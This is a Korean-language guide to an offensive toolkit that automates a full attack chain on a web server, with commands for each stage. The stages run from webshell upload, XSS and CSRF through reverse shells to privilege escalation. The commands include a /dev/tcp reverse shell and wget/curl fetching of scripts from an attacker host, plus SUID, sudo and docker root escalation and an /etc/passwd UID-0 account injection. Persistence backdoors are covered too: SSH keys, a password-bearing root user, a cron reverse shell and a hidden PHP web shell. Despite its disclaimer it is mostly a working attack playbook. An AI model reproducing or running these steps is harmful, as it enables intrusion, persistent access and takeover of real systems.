# 전체 공격 체인 가이드

## 개요

이 가이드는 웹 애플리케이션 초기 침투부터 서버 완전 장악까지의 전체 공격 체인을 설명합니다.

## 공격 체인 구조

```
┌─────────────────────────────────────────────────────────────┐
│                      공격 플로우                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 초기 침투 (Initial Access)                              │
│     ├─ SQL Injection 인증 우회                              │
│     ├─ 웹쉘 업로드 (File Upload RCE)                        │
│     ├─ LFI (Local File Inclusion)                          │
│     ├─ Stored XSS                                           │
│     └─ CSRF Phishing                                        │
│                                                             │
│  2. 후속 공격 (Post-Exploitation)                           │
│     ├─ 시스템 정보 수집                                     │
│     ├─ 권한 상승 벡터 탐색                                  │
│     └─ Reverse Shell 획득                                   │
│                                                             │
│  3. 권한 상승 (Privilege Escalation)                        │
│     ├─ SUID 바이너리 악용                                   │
│     ├─ Sudo 권한 악용                                       │
│     ├─ /etc/passwd 쓰기 권한                                │
│     ├─ Docker 그룹 멤버십                                   │
│     └─ Kernel Exploit                                       │
│                                                             │
│  4. 영속성 확보 (Persistence)                               │
│     ├─ SSH 백도어 (authorized_keys)                         │
│     ├─ 백도어 사용자 생성 (UID 0)                          │
│     ├─ Cron 백도어                                          │
│     ├─ SUID 백도어                                          │
│     └─ 웹 백도어 (.system.php)                              │
│                                                             │
│  5. 서버 완전 장악 (Full Compromise)                        │
│     └─ SSH 직접 접속                                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

## 파일 구조

```
H/
├── auto.py                      # 초기 침투 스크립트 (XSS, CSRF, 웹쉘 등)
├── post_exploit.py              # 후속 공격 스크립트 (정보 수집, Reverse Shell)
├── privilege_escalation.sh      # 권한 상승 스크립트 (타겟에서 실행)
├── backdoor_install.sh          # 백도어 설치 스크립트 (root 권한 필요)
├── full_attack_chain.sh         # 전체 자동화 스크립트
├── run_attack.sh                # auto.py 래퍼 스크립트
├── clear_target_db.sh           # 타겟 DB 초기화
└── update_attacker_server.sh    # 공격자 서버 업데이트
```

## 사용 방법

### 방법 1: 완전 자동화 (권장)

```bash
# 전체 공격 체인 실행
./full_attack_chain.sh <TARGET_IP> <ATTACKER_IP>

# 예시
./full_attack_chain.sh 15.164.95.252 13.158.67.78
```

**참고:** 일부 단계는 수동 개입이 필요합니다 (Reverse Shell, 권한 상승)

### 방법 2: 단계별 실행

#### 1단계: 초기 침투

```bash
# 타겟 서버 DB 초기화
./clear_target_db.sh <TARGET_IP>

# 공격 실행
./run_attack.sh <TARGET_IP> <ATTACKER_IP>

# 또는 직접
python3 auto.py http://<TARGET_IP> http://<ATTACKER_IP>:5000
```

**결과:**
- 웹쉘 업로드 완료
- XSS 공격 게시물 생성
- CSRF fake-gift.html 생성
- 보안 리포트 생성 (`reports/`)

#### 2단계: 후속 공격

```bash
# 시스템 정보 수집
python3 post_exploit.py <TARGET_IP> <ATTACKER_IP> 4444
```

**옵션:**
1. Reverse Shell 획득 (추천)
2. 웹쉘 계속 사용
3. 종료

**Reverse Shell 획득:**

터미널 1 (로컬):
```bash
nc -lvnp 4444
```

터미널 2 (로컬):
```bash
python3 post_exploit.py <TARGET_IP> <ATTACKER_IP> 4444
# 옵션 1 선택
```

터미널 1에서 연결 확인 후:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

#### 3단계: 권한 상승

**Reverse Shell 내에서 실행:**

```bash
# 작업 디렉토리
cd /tmp
mkdir -p .work
cd .work

# 권한 상승 스크립트 다운로드
wget http://<ATTACKER_IP>:5000/scripts/privilege_escalation.sh
# 또는
curl -O http://<ATTACKER_IP>:5000/scripts/privilege_escalation.sh

# 실행
chmod +x privilege_escalation.sh
bash privilege_escalation.sh
```

**권한 상승 방법 (스크립트가 자동 탐지):**
- SUID 바이너리 (find, vim, less 등)
- Sudo NOPASSWD 권한
- /etc/passwd 쓰기 권한
- Docker 그룹 멤버십
- Kernel Exploit (DirtyCow 등)

**수동 권한 상승 예시:**

```bash
# SUID find
/usr/bin/find /etc/passwd -exec /bin/bash -p \;

# Sudo vim
sudo vim -c ':!/bin/bash'

# Docker
docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# /etc/passwd 쓰기 가능
echo 'hacked:$1$hacked$XjdKNyiHH8v2E4mQC5K9M0:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacked  # 비밀번호: hacked
```

#### 4단계: 백도어 설치

**Root 권한 획득 후:**

```bash
# 백도어 설치 스크립트 다운로드
wget http://<ATTACKER_IP>:5000/scripts/backdoor_install.sh
# 또는
curl -O http://<ATTACKER_IP>:5000/scripts/backdoor_install.sh

# 실행 (root 권한 필요!)
chmod +x backdoor_install.sh
bash backdoor_install.sh <ATTACKER_IP>
```

**설치되는 백도어:**

1. **SSH 백도어**
   - 공격자 공개키를 `/root/.ssh/authorized_keys`에 추가
   - PermitRootLogin yes
   - PasswordAuthentication yes

2. **백도어 사용자**
   - 사용자: `sysadmin`
   - 비밀번호: `P@ssw0rd123!`
   - UID: 0 (root 권한)

3. **Cron 백도어**
   - 매 5분마다 공격자에게 Reverse Shell 연결 시도
   - 위치: `/etc/cron.d/system_update`

4. **SUID 백도어**
   - 위치: `/usr/local/bin/update-checker`
   - 실행: `update-checker --shell`

5. **웹 백도어**
   - 위치: `/var/www/html/.system.php`
   - 접속: `http://<TARGET_IP>/.system.php?c=id`

#### 5단계: 서버 접속 확인

**SSH 접속:**

```bash
# 백도어 사용자
ssh sysadmin@<TARGET_IP>
# 비밀번호: P@ssw0rd123!

# Root 키 사용
ssh root@<TARGET_IP>
```

**웹 백도어:**

```bash
curl "http://<TARGET_IP>/.system.php?c=whoami"
```

**SUID 백도어:**

```bash
ssh sysadmin@<TARGET_IP>
/usr/local/bin/update-checker --shell
```

**Cron 백도어 (자동):**

```bash
# 로컬에서 리스너 실행
nc -lvnp 4444

# 5분 이내에 타겟에서 자동으로 연결됨
```

## 실행 예시

### 완전 자동화 실행

```bash
$ ./full_attack_chain.sh 15.164.95.252 13.158.67.78

============================================================
전체 공격 체인 자동화
============================================================
타겟 IP:      15.164.95.252
공격자 IP:    13.158.67.78
Flask 서버:   13.158.67.78:5000
Reverse Shell: 4444
============================================================

계속하시겠습니까? (y/n): y

============================================================
단계 0: 사전 확인
============================================================
[*] 필수 파일 확인...
[+] auto.py 존재
[+] post_exploit.py 존재
[+] privilege_escalation.sh 존재
[+] backdoor_install.sh 존재
[+] run_attack.sh 존재

[*] 타겟 서버 연결 확인...
[+] 타겟 서버 응답 확인

[*] 공격자 서버 확인...
[+] 공격자 Flask 서버 실행 중

============================================================
단계 1: 초기 침투 (웹쉘 업로드 + XSS + CSRF)
============================================================
[*] run_attack.sh 실행 중...
[+] 초기 침투 성공!

...
```

## 트러블슈팅

### 문제 1: 웹쉘을 찾을 수 없음

```bash
# 수동으로 웹쉘 위치 확인
curl http://<TARGET_IP>/uploads/shell.php?cmd=whoami

# 또는 다른 경로 시도
curl http://<TARGET_IP>/vulnerable-sns/www/uploads/shell.php?cmd=whoami
```

### 문제 2: Reverse Shell이 연결되지 않음

```bash
# 방화벽 확인
sudo ufw status

# 포트 리스닝 확인
nc -lvnp 4444

# 다른 Reverse Shell 페이로드 시도
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

### 문제 3: 권한 상승 실패

```bash
# 수동으로 벡터 확인
find / -perm -4000 -type f 2>/dev/null
sudo -l
groups
cat /etc/crontab

# LinPEAS 실행
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 문제 4: 백도어 설치 실패

```bash
# Root 권한 확인
whoami  # root여야 함

# 수동 설치
mkdir -p /root/.ssh
echo "<공격자 공개키>" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# SSH 설정 변경
vi /etc/ssh/sshd_config
# PermitRootLogin yes
# PasswordAuthentication yes
systemctl restart sshd
```

## 공격 후 정리

### 로그 확인

```bash
# 공격 로그
ls -lh logs/

# 보안 리포트
ls -lh reports/
```

### 타겟 복구 (테스트 환경)

```bash
# 백도어 제거
ssh root@<TARGET_IP>
userdel -r sysadmin
rm /etc/cron.d/system_update
rm /usr/local/bin/update-checker
rm /var/www/html/.system.php
sed -i '/PermitRootLogin yes/d' /etc/ssh/sshd_config
systemctl restart sshd

# DB 초기화
./clear_target_db.sh <TARGET_IP>
```

## 주의사항

1. **합법적 권한 확인**: 이 도구는 승인된 침투 테스트, CTF, 교육 목적으로만 사용하세요.
2. **로그 관리**: 모든 활동이 `logs/` 디렉토리에 기록됩니다.
3. **네트워크 격리**: 실제 프로덕션 환경에서 절대 사용하지 마세요.
4. **백업**: 공격 전 타겟 시스템의 백업을 생성하세요.

## 참고 자료

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **GTFOBins**: https://gtfobins.github.io/
- **PEASS-ng**: https://github.com/carlospolop/PEASS-ng
- **Reverse Shell Cheat Sheet**: https://github.com/swisskyrepo/PayloadsAllTheThings

## 라이센스

이 도구는 교육 및 보안 연구 목적으로 제공됩니다.
